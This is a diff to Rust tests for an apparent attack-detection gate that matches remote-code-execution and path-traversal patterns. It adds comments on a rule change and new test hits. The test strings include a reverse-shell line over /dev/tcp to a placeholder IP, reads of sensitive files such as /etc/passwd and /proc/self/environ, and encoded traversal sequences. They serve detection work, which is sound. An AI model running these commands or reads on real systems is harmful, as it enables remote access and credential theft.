@@ -2716,8 +2716,20 @@ mod tests {
         // codex A-3: the shell / blind gate is BUILT from the default-on RCE +
         // Traversal detector patterns (single source of truth). A representative
         // de-obfuscated hit for each default-on rule must pass the shared gate, and
-        // structures moved out of the default-on set (bare mkfifo, `/etc/hosts`)
-        // and benign prose must NOT.
+        // structures outside the default-on set (bare mkfifo) and benign prose must
+        // NOT.
+        //
+        // This test is where the v0.2.187 default-on flip is visible as something
+        // more than a rule toggle. `docs/lane2-rule-pricing.md` priced the seven
+        // free rules through `rules_enabled`, which is a runtime amendment and does
+        // NOT widen this gate — the gate reads the compiled-in `default_on` literal.
+        // Flipping the literal therefore does one thing the pricing run could not
+        // measure: `/etc/hosts` and `/proc/self` now pass the gate, so a base64 or
+        // shell-quoted payload that decodes to one of them is worth a synthetic
+        // view where before it was discarded. That is the intended direction (the
+        // gate must never reject a structure the default-on detector accepts), and
+        // it is why the lane2 harness was re-run against the flip rather than
+        // trusting the sweep's numbers.
         let re = NORMALISED_STRONG_STRUCTURE.as_ref().expect("shared gate compiles");
         for hit in [
             "bash -i >& /dev/tcp/1.2.3.4/9001", // reverse_shell (/dev/tcp)
@@ -2733,14 +2745,16 @@ mod tests {
             "/etc/passwd",                      // traversal.sensitive_abs
             "%2e%2e%2f",                        // traversal.encoded_dotdot
             "..%c0%af",                         // traversal.overlong
+            "/etc/hosts",                       // traversal.sensitive_abs_ops (v0.2.187)
+            "/proc/self/environ",               // traversal.sensitive_abs_ops (v0.2.187)
         ] {
             assert!(re.is_match(hit), "shared gate must accept a default-on hit: {hit:?}");
         }
         for miss in [
-            "mkfifo is a posix utility for named pipes", // mkfifo moved to default-off
+            "mkfifo is a posix utility for named pipes", // mkfifo is default-off
             "the quick brown fox jumps over the dog",
             "python is a great language",
-            "resolver reads /etc/hosts for lookups", // /etc/hosts moved to default-off
+            "resolver reads /etc/resolv.conf for lookups", // no default-on rule matches
         ] {
             assert!(!re.is_match(miss), "shared gate must reject: {miss:?}");
         }
